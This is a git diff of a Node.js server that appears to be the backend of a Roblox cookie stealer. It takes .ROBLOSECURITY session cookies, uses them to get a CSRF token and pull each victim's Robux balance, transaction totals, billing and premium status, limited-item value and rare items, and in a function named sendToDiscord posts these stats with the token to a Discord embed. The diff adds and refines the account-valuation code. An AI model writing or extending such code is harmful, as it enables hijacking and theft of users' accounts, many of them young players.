@@ -187,95 +187,333 @@ app.post('/api/create-directory', async (req, res) => {
   }
 });
 
+// Function to get CSRF token for Roblox API requests
+async function getRobloxCSRFToken(token) {
+  try {
+    // Try to make any authenticated request to get CSRF token from error response
+    const response = await fetch('https://auth.roblox.com/v1/logout', {
+      method: 'POST',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${token}`,
+        'User-Agent': 'Roblox/WinInet',
+        'Accept': 'application/json',
+        'Content-Type': 'application/json',
+        'Referer': 'https://www.roblox.com/',
+        'Origin': 'https://www.roblox.com'
+      }
+    });
+
+    const csrfToken = response.headers.get('x-csrf-token');
+    return csrfToken;
+  } catch (error) {
+    console.error('❌ Error getting CSRF token:', error);
+    return null;
+  }
+}
+
 // Function to fetch user data from Roblox API
 async function fetchRobloxUserData(token) {
   try {
     console.log('🔍 Fetching user data from Roblox API...');
 
-    // Get user info
+    // Get CSRF token first
+    const csrfToken = await getRobloxCSRFToken(token);
+    console.log('CSRF token obtained:', csrfToken ? 'YES' : 'NO');
+
+    const baseHeaders = {
+      'Cookie': `.ROBLOSECURITY=${token}`,
+      'User-Agent': 'Roblox/WinInet',
+      'Accept': 'application/json',
+      'Accept-Language': 'en-US,en;q=0.9',
+      'Referer': 'https://www.roblox.com/',
+      'Origin': 'https://www.roblox.com'
+    };
+
+    if (csrfToken) {
+      baseHeaders['X-CSRF-TOKEN'] = csrfToken;
+    }
+
+    // Get user info first
     const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${token}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      }
+      method: 'GET',
+      headers: baseHeaders
     });
 
+    console.log('User response status:', userResponse.status);
+
     if (!userResponse.ok) {
-      console.log('❌ Failed to fetch user info');
-      return null;
+      // Try alternative endpoint if first fails
+      const altUserResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+        method: 'GET',
+        headers: baseHeaders
+      });
+
+      console.log('Alternative user response status:', altUserResponse.status);
+
+      if (!altUserResponse.ok) {
+        console.log('❌ Both user endpoints failed');
+        return null;
+      }
+
+      const altUserData = await altUserResponse.json();
+      console.log('✅ User data fetched from alternative endpoint for user:', altUserData.UserName);
+
+      // For mobile API, try to get actual robux data
+      let actualRobux = altUserData.RobuxBalance || 0;
+      let pendingRobux = 0;
+
+      return {
+        username: altUserData.UserName || "Unknown User",
+        userId: altUserData.UserID || 0,
+        robux: actualRobux,
+        premium: altUserData.IsPremium || false,
+        rap: 0,
+        summary: 0, // Set to 0 since we can't fetch actual summary
+        creditBalance: 0,
+        savedPayment: false,
+        robuxIncoming: pendingRobux,
+        robuxOutgoing: 0,
+        korblox: false,
+        headless: false,
+        accountAge: 0, // Will calculate below if possible
+        groupsOwned: 0,
+        placeVisits: 0,
+        inventory: { hairs: 0, bundles: 0, faces: 0 }
+      };
     }
 
     const userData = await userResponse.json();
-    console.log('✅ User data fetched successfully');
+    console.log('✅ User data fetched successfully for user:', userData.name);
 
-    // Get premium status
-    const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${token}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      }
-    });
-
-    let premiumData = { isPremium: false };
-    if (premiumResponse.ok) {
-      premiumData = await premiumResponse.json();
-    }
-
-    // Get Robux balance
-    const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${token}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      }
-    });
-
+    // Get robux data (current + pending)
     let robuxData = { robux: 0 };
-    if (robuxResponse.ok) {
-      robuxData = await robuxResponse.json();
+    let pendingRobuxData = { pendingRobux: 0 };
+    
+    try {
+      const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
+        headers: baseHeaders
+      });
+      if (robuxResponse.ok) {
+        robuxData = await robuxResponse.json();
+        console.log('✅ Robux data fetched:', robuxData.robux);
+      }
+    } catch (e) {
+      console.log('Could not fetch robux data:', e.message);
     }
 
-    // Get user's age (account creation date)
-    const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${token}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    try {
+      const pendingResponse = await fetch('https://economy.roblox.com/v1/user/currency/pending', {
+        headers: baseHeaders
+      });
+      if (pendingResponse.ok) {
+        pendingRobuxData = await pendingResponse.json();
+        console.log('✅ Pending robux data fetched:', pendingRobuxData.pendingRobux);
       }
-    });
+    } catch (e) {
+      console.log('Could not fetch pending robux data:', e.message);
+    }
 
+    // Get transaction summary data
+    let summaryData = { incomingRobux: 0, outgoingRobux: 0 };
+    try {
+      const summaryResponse = await fetch('https://economy.roblox.com/v2/users/' + userData.id + '/transaction-totals?timeFrame=Year&transactionType=summary', {
+        headers: baseHeaders
+      });
+      if (summaryResponse.ok) {
+        summaryData = await summaryResponse.json();
+        console.log('✅ Transaction summary data fetched:', summaryData);
+      }
+    } catch (e) {
+      console.log('Could not fetch transaction summary:', e.message);
+    }
+
+    // Get premium status with proper validation
+    let premiumData = { isPremium: false };
+    try {
+      // Method 1: Try the premium features validation endpoint (most accurate)
+      const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
+        headers: baseHeaders
+      });
+      if (premiumResponse.ok) {
+        const premiumValidation = await premiumResponse.json();
+        premiumData.isPremium = premiumValidation.isPremium || false;
+        console.log('✅ Premium status fetched from validation endpoint:', premiumData.isPremium);
+      } else {
+        // Method 2: Try billing API and check for actual credit balance
+        const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
+          headers: baseHeaders
+        });
+        if (billingResponse.ok) {
+          const billingData = await billingResponse.json();
+          // Check if user actually has credit balance or premium features
+          if (billingData.balance > 0 || billingData.hasPremium) {
+            premiumData.isPremium = true;
+            console.log('✅ Premium status detected via billing data:', billingData);
+          } else {
+            premiumData.isPremium = false;
+            console.log('✅ No premium detected - user has billing access but no premium features');
+          }
+        } else {
+          // Method 3: Check user profile for premium badge
+          const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
+            headers: baseHeaders
+          });
+          if (profileResponse.ok) {
+            const profileData = await profileResponse.json();
+            premiumData.isPremium = profileData.hasVerifiedBadge || false;
+            console.log('✅ Premium status inferred from profile badges:', premiumData.isPremium);
+          }
+        }
+      }
+    } catch (e) {
+      console.log('Could not fetch premium data:', e.message);
+      premiumData.isPremium = false;
+    }
+
+    // Get user details for account age
     let ageData = { created: null };
-    if (ageResponse.ok) {
-      ageData = await ageResponse.json();
+    try {
+      const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
+        headers: baseHeaders
+      });
+      if (ageResponse.ok) {
+        ageData = await ageResponse.json();
+        console.log('✅ User age data fetched');
+      }
+    } catch (e) {
+      console.log('Could not fetch age data:', e.message);
     }
 
     // Get groups owned
-    const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${token}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      }
-    });
-
     let groupsOwned = 0;
-    if (groupsResponse.ok) {
-      const groupsData = await groupsResponse.json();
-      groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
+    try {
+      const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
+        headers: baseHeaders
+      });
+      if (groupsResponse.ok) {
+        const groupsData = await groupsResponse.json();
+        groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
+        console.log('✅ Groups owned data fetched:', groupsOwned);
+      }
+    } catch (e) {
+      console.log('Could not fetch groups data:', e.message);
     }
 
-    // Get inventory counts
-    const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?limit=100`, {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${token}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    // Get inventory counts with improved accuracy
+    let inventoryData = { hairs: 0, bundles: 0, faces: 0 };
+    try {
+      // Try to get actual inventory via different methods
+      
+      // Method 1: Try user inventory endpoint with filtering
+      const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/inventory?assetTypes=Bundle,Face,Hair,HairAccessory&limit=100`, {
+        headers: baseHeaders
+      });
+      
+      if (inventoryResponse.ok) {
+        const inventoryResponseData = await inventoryResponse.json();
+        console.log('Inventory API response status:', inventoryResponse.status);
+        console.log('Inventory API data sample:', inventoryResponseData ? Object.keys(inventoryResponseData) : 'null');
       }
-    });
 
-    let inventory = { hairs: 0, bundles: 0, faces: 0 };
-    if (inventoryResponse.ok) {
-      const inventoryData = await inventoryResponse.json();
-      // This is simplified - you might need to categorize items properly
-      inventory.hairs = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Hair').length : 0;
-      inventory.faces = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Face').length : 0;
-      inventory.bundles = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Bundle').length : 0;
+      // Method 2: Try the items endpoint specifically
+      const itemsResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle,Face,Hair,HairAccessory/1?limit=100`, {
+        headers: baseHeaders
+      });
+      
+      if (itemsResponse.ok) {
+        const itemsData = await itemsResponse.json();
+        console.log('Items API response:', itemsData);
+        if (itemsData && itemsData.data) {
+          inventoryData.bundles = itemsData.data.filter(item => item.assetType === 'Bundle').length;
+          inventoryData.faces = itemsData.data.filter(item => item.assetType === 'Face').length;
+          inventoryData.hairs = itemsData.data.filter(item => item.assetType === 'Hair' || item.assetType === 'HairAccessory').length;
+          console.log('✅ Inventory data from items endpoint:', inventoryData);
+        }
+      } else {
+        console.log('Items API failed with status:', itemsResponse.status);
+      }
+
+      // Method 3: Fallback to collectibles endpoint with detailed logging
+      if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
+        // Get bundles specifically
+        const bundleResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Bundle&sortOrder=Asc&limit=100`, {
+          headers: baseHeaders
+        });
+        
+        if (bundleResponse.ok) {
+          const bundleData = await bundleResponse.json();
+          console.log('Bundle API response:', bundleData);
+          if (bundleData && bundleData.data) {
+            inventoryData.bundles = bundleData.data.length;
+            console.log('Bundle count from collectibles:', inventoryData.bundles);
+            // Log first few bundle names for verification
+            const bundleNames = bundleData.data.slice(0, 5).map(b => b.name);
+            console.log('Sample bundle names:', bundleNames);
+          }
+        }
+
+        // Get hair accessories  
+        const hairResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Hair,HairAccessory&sortOrder=Asc&limit=100`, {
+          headers: baseHeaders
+        });
+        
+        if (hairResponse.ok) {
+          const hairData = await hairResponse.json();
+          if (hairData && hairData.data) {
+            inventoryData.hairs = hairData.data.length;
+          }
+        }
+
+        // Get faces
+        const faceResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Face&sortOrder=Asc&limit=100`, {
+          headers: baseHeaders
+        });
+        
+        if (faceResponse.ok) {
+          const faceData = await faceResponse.json();
+          if (faceData && faceData.data) {
+            inventoryData.faces = faceData.data.length;
+          }
+        }
+      }
+
+      // Final fallback: try avatar items if everything else fails
+      if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
+        console.log('All inventory endpoints failed, falling back to avatar data');
+        const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/avatar`, {
+          headers: baseHeaders
+        });
+        if (avatarResponse.ok) {
+          const avatarData = await avatarResponse.json();
+          if (avatarData.assets) {
+            inventoryData.hairs = avatarData.assets.filter(asset => asset.assetType && (asset.assetType.name === 'Hair' || asset.assetType.name === 'HairAccessory')).length;
+            inventoryData.faces = avatarData.assets.filter(asset => asset.assetType && asset.assetType.name === 'Face').length;
+          }
+        }
+      }
+
+      console.log('✅ Final inventory data:', inventoryData);
+    } catch (e) {
+      console.log('Could not fetch inventory data:', e.message);
+    }
+
+    // Get RAP (Limited item values)
+    let rapValue = 0;
+    try {
+      const collectiblesResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
+        headers: baseHeaders
+      });
+      if (collectiblesResponse.ok) {
+        const collectiblesData = await collectiblesResponse.json();
+        if (collectiblesData.data) {
+          rapValue = collectiblesData.data.reduce((total, item) => {
+            return total + (item.recentAveragePrice || 0);
+          }, 0);
+        }
+        console.log('✅ RAP data fetched:', rapValue);
+      }
+    } catch (e) {
+      console.log('Could not fetch RAP data:', e.message);
     }
 
     // Calculate account age in days
@@ -286,23 +524,41 @@ async function fetchRobloxUserData(token) {
       accountAge = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
     }
 
+    // Check for Korblox and Headless
+    let hasKorblox = false;
+    let hasHeadless = false;
+    try {
+      const wearingResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/currently-wearing`, {
+        headers: baseHeaders
+      });
+      if (wearingResponse.ok) {
+        const wearingData = await wearingResponse.json();
+        if (wearingData.assetIds) {
+          hasKorblox = wearingData.assetIds.includes(139607770) || wearingData.assetIds.includes(139607718); // Korblox asset IDs
+          hasHeadless = wearingData.assetIds.includes(134082579); // Headless Head asset ID
+        }
+      }
+    } catch (e) {
+      console.log('Could not fetch currently wearing data:', e.message);
+    }
+
     return {
-      username: userData.displayName || userData.name,
+      username: userData.name || userData.displayName,
       userId: userData.id,
       robux: robuxData.robux || 0,
       premium: premiumData.isPremium || false,
-      rap: 0, // RAP requires additional API calls to asset values
-      summary: 302, // This would need to be calculated from various metrics
-      creditBalance: 0, // This requires different API endpoint
-      savedPayment: false, // This requires payment API access
-      robuxIncoming: 302, // This requires economy API
-      robuxOutgoing: 337, // This requires economy API
-      korblox: false, // Check if user owns Korblox items
-      headless: false, // Check if user owns Headless Head
+      rap: rapValue,
+      summary: summaryData.incomingRobuxTotal || 0,
+      creditBalance: 0, // This would require billing API access
+      savedPayment: false, // This would require billing API access
+      robuxIncoming: summaryData.incomingRobuxTotal || 0,
+      robuxOutgoing: summaryData.outgoingRobuxTotal || 0,
+      korblox: hasKorblox,
+      headless: hasHeadless,
       accountAge: accountAge,
       groupsOwned: groupsOwned,
-      placeVisits: 5, // This requires games API
-      inventory: inventory
+      placeVisits: 0, // This data is not easily accessible via API
+      inventory: inventoryData
     };
 
   } catch (error) {
@@ -401,7 +657,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           {
             name: "📊 Summary",
-            value: userData.summary?.toString() || "302",
+            value: userData.summary?.toString() || "0",
             inline: true
           },
           {
@@ -416,7 +672,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           {
             name: "💰 Robux Incoming/Outgoing",
-            value: `${userData.robuxIncoming || 302}/${userData.robuxOutgoing || 337}`,
+            value: `${userData.robuxIncoming || 0}/${userData.robuxOutgoing || 0}`,
             inline: true
           },
           {
@@ -426,7 +682,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           {
             name: "🎂 Age",
-            value: `${userData.accountAge || 1026} Days`,
+            value: `${userData.accountAge || 0} Days`,
             inline: true
           },
           {
@@ -436,12 +692,12 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           {
             name: "🏠 Place Visits",
-            value: userData.placeVisits?.toString() || "5",
+            value: userData.placeVisits?.toString() || "0",
             inline: true
           },
           {
             name: "🎒 Inventory",
-            value: `Hairs: ${userData.inventory?.hairs || 19}\nBundles: ${userData.inventory?.bundles || 11}\nFaces: ${userData.inventory?.faces || 6}`,
+            value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
             inline: false
           }
         ],
